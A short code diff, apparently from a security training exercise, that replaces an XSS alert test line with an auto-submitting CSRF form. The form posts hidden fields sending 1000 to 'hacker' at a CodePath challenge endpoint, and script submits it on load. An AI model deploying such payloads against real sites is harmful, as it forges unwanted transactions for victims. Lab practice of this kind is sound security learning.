@@ -1,2 +1,8 @@
-<script>alert('xss')</script>
-  
+<form name="csrfForm" action="https://security.codepath.com//user/csrfchallengetwo/plusplus" method="POST">
+  <input type="hidden" name="giveMoneyTo" value="hacker" />
+  <input type="hidden" name="giveAmount" value="1000" />
+  <input type="submit"/>
+</form>
+<script>
+document.csrfForm.submit();
+</script> 
